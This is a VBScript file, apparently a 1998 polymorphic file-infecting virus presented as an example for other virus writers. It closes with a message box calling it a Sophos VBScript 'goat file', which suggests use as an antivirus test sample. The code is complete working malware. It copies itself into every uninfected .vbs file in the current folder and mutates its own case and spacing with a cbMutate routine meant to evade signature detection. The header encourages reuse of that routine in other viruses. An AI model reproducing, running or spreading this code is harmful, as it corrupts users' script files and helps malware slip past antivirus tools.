'**********
'     A   pOLymOrphIC     eXAMpLe VB   ScripT     ViRuS   BASED     ON   vbSv777
' bY  SpO0ky + caD   -   14.  NOV.     1998   -
' feeL    FrEE tO     usE    THE  cbMUTate   FUNctiOn   iN YOur OWN   bUGs     :-)

  coNSt cbForREaDIng =    1   ,    cbForWRitinG   =     2

     RanDomIZE
    
    cbWEpATH  =   WScRIPt  .   sCrIPtfULLNAME
 
  SeT   CBfSO     =     cReAteoBJEcT     (    "scRiPtInG.FileSysTEmoBjeCt"  )
 
 SET cbWefIlE  = CbFsO   .   oPENTEXTfilE    (    CbWepaTh  ,  CbfORrEAdInG     )
 cBwECode    =    cBWEFiLe .    reAdalL
    CbWEFILe    .    cLOsE
   
    CBvIRusSiZE   =  iNStR (   3 , CBWecoDe     ,   "*****"  &  "*****"    )    +     10 +     1

  seT     cBWeFilE   =   cbfSo  .   openTEXtfIle    (    CBwePaTh ,     cbfORreADInG    )
 CBwecOde     = cBwefILe    .  rEad     ( CbViRuSsiZE )
   cbwEfiLE . cLoSE
     
    FOr eAcH     CbFiLE     IN    cbfso     . getFOLDeR   (    "."    )     .  FilES
 
     iF   lCaSe   (   CBfSO .    GEtExTeNSIOnNAme     (    CBFILe   .   nAmE    )     )    =     CHr  (    118     )    &  cHR    (  98    )  &  cHR  (   115  )   tHeN
    
    seT  CbvICTimFIle     =    cBFso   . oPeNtextfILe  (     CBFile . pATH     ,     CbFoRREAdIng  )
 CbINfEctIoNmARKer = cBvICtiMFILe    .   reAd    (   11   )
    cbVICTiMFilE    .     clOsE
     
  if    CBINfEcTIOnmARKeR   <>  "'*****"  &    "*****"  tHeN

    sEt   cbVIctiMFIle    =     CBFsO    .    OPentEXtFiLe    ( cbFilE    . pATH    ,   cbfORreAdinG   )
    CBvICtiMCOde     =    cBviCTImFiLe   .   reAdALl
  CbVicTiMfILe  . ClOSe
 
   cbviCtIMCodE  =  cbmutATe   (     cBWecODE    )   &    cBVIctiMcodE
 
     sEt  CbVicTiMFIle     =    cbFSo  . opENTexTFiLE    (    cBfiLe . Path    ,     cbFORwritInG   , 1   )
    CBviCtiMFile  .   writE   CbViCtImcODe
 CBVIcTIMFILE  .    CLoSe
  
 End   If
  
 eNd     IF
   
 NExT
 
  
   fUnCTIoN     CBMuTaTe   (  cBsTRInG )
 
    CBnewstrING   =   ""
   CbI   =    1
     
    whILE  CBi <=    lEN (    CBstRINg )
 
   if mid ( CbsTrING  , cBi   ,   1 )     =    Chr    (   32     )  THen

 FOR cbJ   =     1     To   inT (  5   *    rnD   )   +   1

    cbneWsTRiNG    =    CBNeWstRING     +   CHr  (     32  )

    NEXt
    
  do
    
    CBI =   cbi +    1
   
   lOop     wHiLe    mid    (   cbSTRiNg   ,     CbI  ,   1  ) =  chr    ( 32    )
     
     elSe
  
 IF    INt    (  2 *   rnd    )     +  1   =    1   tHen

 cBNewstRINg  =     cBNEWsTrinG +    UcAsE   (  MID (    CBStRINg     ,     cbI ,     1 )   )

    elSE

     cBNEwStRING     = cBNewsTrinG + lCAse     (     MiD  (    cbsTRIng ,   CBi     , 1    )    )

    eNd  if

    CBi     = cBI  + 1
  
  END    iF
    
     wenD
    
    cbmUTate  =   CbneWsTrIng
    
   End  FUnCTIOn
  
    '**********
MsgBox("Sophos VBScript goat file")
